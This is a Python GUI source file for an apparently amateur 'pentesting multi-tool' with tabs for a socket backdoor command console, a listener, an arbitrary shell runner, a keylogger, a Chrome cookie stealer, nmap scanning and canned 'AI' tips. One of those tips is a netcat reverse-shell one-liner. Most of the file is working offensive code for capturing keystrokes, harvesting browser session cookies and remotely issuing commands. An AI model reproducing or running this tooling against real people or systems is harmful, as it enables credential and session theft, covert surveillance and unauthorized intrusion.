import socket
import subprocess
import nmap
import threading
import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext
from tkinter import ttk
import logging
from logging.handlers import RotatingFileHandler
import browser_cookie3
from pynput import keyboard
import requests
from bs4 import BeautifulSoup
import re

# Setup Logging with Rotation
log_file = 'multi_tool.log'
log_handler = RotatingFileHandler(log_file, maxBytes=1024*1024, backupCount=5)  # 1MB per log, 5 backups
logging.basicConfig(handlers=[log_handler], level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
LHOST = "localhost"
RHOST = "target_ip"
PROXY = "proxy_ip:proxy_port"
NMAP_ARGS = "-Pn -sT -O"

# Banner to be printed
def print_banner():
    """Prints the banner for the tool."""
    banner = """
    ███╗   ██╗██╗   ██╗██╗     ██████╗██╗   ██╗██╗      ██████╗██╗
    ████╗  ██║██║   ██║██║     ██╔════╝██║   ██║██║     ██╔════╝██║
    ██╔██╗ ██║██║   ██║██║     ██║     ███████║██║     ██║     ██║
    ██║╚██╗██║██║   ██║██║     ██║     ██╔══██║██║     ██║     ██║
    ██║ ╚████║╚██████╔╝███████╗╚██████╗██║  ██║███████╗╚██████╗██║
    ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝
    MultiToolV5 - Enhanced Multi-Tool for Pentesting 🛠️
    """
    print(banner)

# ===================== Utility Functions ===================== #

def show_message(title, message):
    """Show a simple message box."""
    messagebox.showinfo(title, message)

def handle_exception(exception):
    """Log and display an exception."""
    logging.error(str(exception))
    messagebox.showerror("Error", str(exception))

# ===================== Scanning Functions ===================== #

def scan_target(rhost, output_area):
    """Perform a passive scan using Nmap and output results to the GUI."""
    try:
        logging.info(f"Starting scan for target: {rhost}")
        nm = nmap.PortScanner()
        nm.scan(rhost, arguments=NMAP_ARGS)
        os_info = get_os_info(nm, rhost)
        result = f"Target OS: {os_info}\n{nm.csv()}"
        output_area.insert(tk.END, result + '\n')
    except Exception as e:
        handle_exception(e)

def get_os_info(nm, rhost):
    """Extract OS information from Nmap results."""
    try:
        return nm[rhost].get('osmatch', [{}])[0].get('name', 'Unknown')
    except KeyError:
        logging.warning(f"OS information not available for: {rhost}")
        return "Unknown OS"

# ===================== Listener & Backdoor ===================== #

def create_backdoor(lhost, port=8080, output_area=None):
    """Create a simple backdoor using sockets."""
    try:
        logging.info(f"Creating backdoor on {lhost}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        output_area.insert(tk.END, f"Connection established with {addr}\n")
        while True:
            cmd = simpledialog.askstring("Command Input", "Enter command:")
            if cmd.lower() in ['exit', 'quit']:
                logging.info("Backdoor session terminated by user.")
                break
            conn.sendall(cmd.encode())
            response = conn.recv(4096).decode()
            output_area.insert(tk.END, response + '\n')
        conn.close()
    except Exception as e:
        handle_exception(e)

def create_listener(lhost, port=8081, output_area=None):
    """Create a listener to receive incoming connections."""
    try:
        logging.info(f"Creating listener on {lhost}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        output_area.insert(tk.END, f"Connected to {addr}\n")
        while True:
            data = conn.recv(4096).decode()
            if not data:
                break
            output_area.insert(tk.END, f"Received: {data}\n")
        conn.close()
    except Exception as e:
        handle_exception(e)

# ===================== Terminal & AI ===================== #

def run_terminal_command(command, output_area):
    """Run any command from the terminal tab."""
    try:
        logging.info(f"Running command: {command}")
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_area.insert(tk.END, output.decode() + '\n')
        if error:
            output_area.insert(tk.END, error.decode() + '\n')
    except Exception as e:
        handle_exception(e)

def ai_suggestions(query, output_area):
    """Simulate AI suggestions for pentesting tasks based on user input."""
    suggestions = {
        "scan": "Use nmap or masscan for scanning. Example: nmap -sS -T4 target_ip",
        "exploit": "Use Metasploit for exploitation. Example: msfconsole -> search exploit.",
        "backdoor": "Reverse shell: nc -e /bin/bash target_ip 4444",
        "password": "Password cracking: Use Hydra or John the Ripper."
    }

    for key in suggestions:
        if key in query.lower():
            output_area.insert(tk.END, suggestions[key] + "\n")
            return
    output_area.insert(tk.END, "No AI suggestion found for the query.\n")

# ===================== Keylogger & Cookie Stealer ===================== #

def start_keylogger(output_area):
    """Start a simple keylogger."""
    def on_press(key):
        try:
            output_area.insert(tk.END, f'{key.char}\n')
        except AttributeError:
            output_area.insert(tk.END, f'{key}\n')

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    output_area.insert(tk.END, "Keylogger started...\n")

def steal_cookies(output_area):
    """Steal cookies from the browser."""
    try:
        output_area.insert(tk.END, "Stealing cookies from Chrome...\n")
        cj = browser_cookie3.chrome()
        for cookie in cj:
            output_area.insert(tk.END, f"Cookie: {cookie}\n")
        output_area.insert(tk.END, "Finished stealing cookies.\n")
    except Exception as e:
        handle_exception(e)

# ===================== DNS Tab Functions ===================== #

def dns_lookup(domain, output_area):
    """Perform DNS lookup for a given domain."""
    try:
        result = socket.gethostbyname(domain)
        output_area.insert(tk.END, f"DNS Lookup Result for {domain}: {result}\n")
    except Exception as e:
        handle_exception(e)

def dns_zone_transfer(domain, output_area):
    """Simulate a DNS Zone Transfer."""
    try:
        output_area.insert(tk.END, f"Simulating DNS Zone Transfer for {domain} (Dummy Function)...\n")
        # In a real tool, we would use DNS libraries to do actual zone transfer.
    except Exception as e:
        handle_exception(e)

# ===================== VS Code-Like Notes Tab ===================== #

def create_notes_tab(output_area):
    """A simple note-taking tab similar to VS Code."""
    try:
        output_area.insert(tk.END, "You can use this section to take notes...\n")
    except Exception as e:
        handle_exception(e)

# ===================== GUI & Application ===================== #

def create_gui():
    """Create the main GUI with tabbed interface."""
    root = tk.Tk()
    root.title("Multi Tool V5 by kdairatchi")

    # Create notebook for tabs
    notebook = ttk.Notebook(root)
    notebook.pack(expand=True, fill='both')

    # Backdoor Tab
    backdoor_tab = ttk.Frame(notebook)
    notebook.add(backdoor_tab, text="Backdoor")
    backdoor_output = scrolledtext.ScrolledText(backdoor_tab, wrap=tk.WORD)
    backdoor_output.pack(expand=True, fill='both')
    backdoor_button = tk.Button(backdoor_tab, text="Start Backdoor", 
                                command=lambda: threading.Thread(target=create_backdoor, 
                                                                  args=(LHOST, 8080, backdoor_output),
                                                                  daemon=True).start())
    backdoor_button.pack(pady=5)

    # Listener Tab
    listener_tab = ttk.Frame(notebook)
    notebook.add(listener_tab, text="Listener")
    listener_output = scrolledtext.ScrolledText(listener_tab, wrap=tk.WORD)
    listener_output.pack(expand=True, fill='both')
    listener_button = tk.Button(listener_tab, text="Start Listener", 
                                command=lambda: threading.Thread(target=create_listener, 
                                                                  args=(LHOST, 8081, listener_output),
                                                                  daemon=True).start())
    listener_button.pack(pady=5)

    # Terminal Tab
    terminal_tab = ttk.Frame(notebook)
    notebook.add(terminal_tab, text="Terminal")
    terminal_output = scrolledtext.ScrolledText(terminal_tab, wrap=tk.WORD)
    terminal_output.pack(expand=True, fill='both')
    terminal_command = tk.Entry(terminal_tab)
    terminal_command.pack(fill='x', padx=10, pady=5)
    terminal_button = tk.Button(terminal_tab, text="Run Command", 
                                command=lambda: run_terminal_command(terminal_command.get(), terminal_output))
    terminal_button.pack(pady=5)

    # Pentest AI Tab
    ai_tab = ttk.Frame(notebook)
    notebook.add(ai_tab, text="Pentest AI")
    ai_output = scrolledtext.ScrolledText(ai_tab, wrap=tk.WORD)
    ai_output.pack(expand=True, fill='both')
    ai_query = tk.Entry(ai_tab)
    ai_query.pack(fill='x', padx=10, pady=5)
    ai_button = tk.Button(ai_tab, text="Ask AI", 
                          command=lambda: ai_suggestions(ai_query.get(), ai_output))
    ai_button.pack(pady=5)

    # Keylogger Tab
    keylogger_tab = ttk.Frame(notebook)
    notebook.add(keylogger_tab, text="Keylogger")
    keylogger_output = scrolledtext.ScrolledText(keylogger_tab, wrap=tk.WORD)
    keylogger_output.pack(expand=True, fill='both')
    keylogger_button = tk.Button(keylogger_tab, text="Start Keylogger", 
                                 command=lambda: threading.Thread(target=start_keylogger, 
                                                                   args=(keylogger_output,), 
                                                                   daemon=True).start())
    keylogger_button.pack(pady=5)

    # Cookie Stealer Tab
    cookie_tab = ttk.Frame(notebook)
    notebook.add(cookie_tab, text="Cookie Stealer")
    cookie_output = scrolledtext.ScrolledText(cookie_tab, wrap=tk.WORD)
    cookie_output.pack(expand=True, fill='both')
    cookie_button = tk.Button(cookie_tab, text="Steal Cookies", 
                              command=lambda: steal_cookies(cookie_output))
    cookie_button.pack(pady=5)

    # DNS Tab
    dns_tab = ttk.Frame(notebook)
    notebook.add(dns_tab, text="DNS Tools")
    dns_output = scrolledtext.ScrolledText(dns_tab, wrap=tk.WORD)
    dns_output.pack(expand=True, fill='both')
    dns_domain = tk.Entry(dns_tab)
    dns_domain.pack(fill='x', padx=10, pady=5)
    dns_lookup_button = tk.Button(dns_tab, text="DNS Lookup", 
                                  command=lambda: dns_lookup(dns_domain.get(), dns_output))
    dns_lookup_button.pack(pady=5)
    dns_zone_button = tk.Button(dns_tab, text="DNS Zone Transfer", 
                                command=lambda: dns_zone_transfer(dns_domain.get(), dns_output))
    dns_zone_button.pack(pady=5)

    # VS Code Notes Tab
    notes_tab = ttk.Frame(notebook)
    notebook.add(notes_tab, text="VS Code Notes")
    notes_output = scrolledtext.ScrolledText(notes_tab, wrap=tk.WORD)
    notes_output.pack(expand=True, fill='both')
    notes_button = tk.Button(notes_tab, text="Create Notes", 
                             command=lambda: create_notes_tab(notes_output))
    notes_button.pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    print_banner()
    create_gui()